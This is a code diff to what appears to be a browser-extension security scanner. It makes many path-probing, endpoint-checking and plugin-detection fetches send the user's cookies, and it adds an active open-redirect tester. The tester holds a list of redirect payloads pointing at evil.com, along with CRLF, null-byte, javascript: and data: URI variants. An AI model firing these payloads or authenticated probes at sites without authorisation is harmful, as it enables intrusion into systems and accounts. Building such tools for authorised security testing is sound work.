@@ -113,7 +113,7 @@ const handlers = {
   },
 
   FETCH_JS: async (msg, _, sr) => {
-    try { const r = await fetch(msg.url); sr({ ok: true, text: await r.text() }); }
+    try { const r = await fetch(msg.url, { credentials: 'include' }); sr({ ok: true, text: await r.text() }); }
     catch (e) { sr({ ok: false, error: e.message }); }
   },
 
@@ -207,7 +207,7 @@ const handlers = {
 
   GET_PAGE_REQUEST_RESPONSE: async (msg, _, sr) => {
     try {
-      const r = await fetch(msg.url, { headers: msg.headers || {} });
+      const r = await fetch(msg.url, { headers: msg.headers || {}, credentials: 'include' });
       const text = await r.text();
       const respHeaders = {}; r.headers.forEach((v, k) => { respHeaders[k] = v; });
       const u = new URL(msg.url);
@@ -350,7 +350,7 @@ const handlers = {
 
   DETECT_WP_PLUGINS: async (msg, _, sr) => {
     try {
-      const r = await fetch(msg.url);
+      const r = await fetch(msg.url, { credentials: 'include' });
       const html = await r.text();
       const plugins = new Map();
       const re = /wp-content\/plugins\/([a-zA-Z0-9_-]+)(?:\/[^?"'\s]*)?(?:\?ver=([0-9.]+))?/g;
@@ -768,11 +768,11 @@ const handlers = {
       const promises = batch.map(async (ep) => {
         const url = ep.startsWith('http') ? ep : origin + (ep.startsWith('/') ? ep : '/' + ep);
         try {
-          const r = await fetch(url, { method: 'HEAD', redirect: 'follow', signal: AbortSignal.timeout(5000) });
+          const r = await fetch(url, { method: 'HEAD', redirect: 'follow', credentials: 'include', signal: AbortSignal.timeout(5000) });
           return { endpoint: ep, url, status: r.status };
         } catch {
           try {
-            const r = await fetch(url, { redirect: 'follow', signal: AbortSignal.timeout(5000) });
+            const r = await fetch(url, { redirect: 'follow', credentials: 'include', signal: AbortSignal.timeout(5000) });
             const len = (await r.text()).length;
             return { endpoint: ep, url, status: r.status, size: len };
           } catch { return { endpoint: ep, url, status: 'err' }; }
@@ -793,11 +793,11 @@ const handlers = {
       const batch = links.slice(i, i + 8);
       const promises = batch.map(async (url) => {
         try {
-          const r = await fetch(url, { method: 'HEAD', redirect: 'follow', signal: AbortSignal.timeout(5000) });
+          const r = await fetch(url, { method: 'HEAD', redirect: 'follow', credentials: 'include', signal: AbortSignal.timeout(5000) });
           return { url, status: r.status, finalUrl: r.url !== url ? r.url : '' };
         } catch {
           try {
-            const r = await fetch(url, { redirect: 'follow', signal: AbortSignal.timeout(5000) });
+            const r = await fetch(url, { redirect: 'follow', credentials: 'include', signal: AbortSignal.timeout(5000) });
             return { url, status: r.status, finalUrl: r.url !== url ? r.url : '' };
           } catch (e) {
             return { url, status: 'dead', error: e.message?.includes('timeout') ? 'Timeout' : 'Connection failed' };
@@ -879,7 +879,7 @@ const handlers = {
       let baselineLen = 0;
       let baselineHash = '';
       try {
-        const br = await fetch(origin + '/cyboware-404-test-' + Date.now(), { redirect: 'manual', signal: AbortSignal.timeout(2000) });
+        const br = await fetch(origin + '/cyboware-404-test-' + Date.now(), { redirect: 'manual', credentials: 'include', signal: AbortSignal.timeout(2000) });
         if (br.status === 200) {
           const bt = await br.text();
           baselineLen = bt.length;
@@ -891,7 +891,7 @@ const handlers = {
       let homeLen = 0;
       let homeHash = '';
       try {
-        const hr = await fetch(origin + '/', { redirect: 'follow', signal: AbortSignal.timeout(2000) });
+        const hr = await fetch(origin + '/', { redirect: 'follow', credentials: 'include', signal: AbortSignal.timeout(2000) });
         const ht = await hr.text();
         homeLen = ht.length;
         homeHash = simpleHash(ht);
@@ -911,7 +911,7 @@ const handlers = {
         const batch = uniquePaths.slice(i, i + 8);
         const promises = batch.map(async (path) => {
           try {
-            const r = await fetch(origin + path, { redirect: 'manual', signal: AbortSignal.timeout(2000) });
+            const r = await fetch(origin + path, { redirect: 'manual', credentials: 'include', signal: AbortSignal.timeout(2000) });
             const interesting = r.status === 200 || r.status === 301 || r.status === 302 || r.status === 401 || r.status === 403;
             if (interesting) {
               let preview = '';
@@ -1050,6 +1050,47 @@ const handlers = {
     } catch (e) { sr({ ok: false, error: e.message }); }
   },
 
+
+  // ═══ OPEN REDIRECT ACTIVE TESTER ═══
+  TEST_REDIRECT: async (msg, _, sr) => {
+    const targetUrl = msg.url;
+    const paramName = msg.param;
+    const payloads = [
+      { p: 'https://evil.com', label: 'Absolute URL' },
+      { p: '//evil.com', label: 'Protocol-relative' },
+      { p: '/\\evil.com', label: 'Backslash bypass' },
+      { p: '/\\/evil.com', label: 'Double backslash' },
+      { p: 'https://evil.com%00.target.com', label: 'Null byte' },
+      { p: 'https://evil.com%0d%0a', label: 'CRLF injection' },
+      { p: '/%09/evil.com', label: 'Tab bypass' },
+      { p: 'https://target.com@evil.com', label: 'At-sign bypass' },
+      { p: 'https://evil.com#target.com', label: 'Fragment bypass' },
+      { p: 'https://evil.com?.target.com', label: 'Query bypass' },
+      { p: 'javascript:alert(1)', label: 'JavaScript URI' },
+      { p: 'data:text/html,<script>alert(1)</script>', label: 'Data URI' },
+    ];
+    const results = [];
+    for (const { p: payload, label } of payloads) {
+      try {
+        const testUrl = new URL(targetUrl);
+        testUrl.searchParams.set(paramName, payload);
+        const r = await fetch(testUrl.toString(), { credentials: 'include', redirect: 'manual', signal: AbortSignal.timeout(5000) });
+        const location = r.headers.get('location') || '';
+        const isRedirect = r.status >= 300 && r.status < 400;
+        const redirectsToEvil = isRedirect && (location.includes('evil.com') || location.includes('javascript:') || location.includes('data:'));
+        const reflected = !isRedirect && r.status === 200;
+        let bodyCheck = '';
+        if (reflected) {
+          const body = await r.text();
+          if (body.includes(payload)) bodyCheck = 'Payload reflected in response body';
+        }
+        results.push({ payload, label, status: r.status, location, isRedirect, redirectsToEvil, bodyCheck, url: testUrl.toString() });
+      } catch (e) {
+        results.push({ payload, label, status: 'err', error: e.message });
+      }
+    }
+    sr({ ok: true, results });
+  },
   // Test Stripe key
   TEST_STRIPE_KEY: async (msg, _, sr) => {
     try {
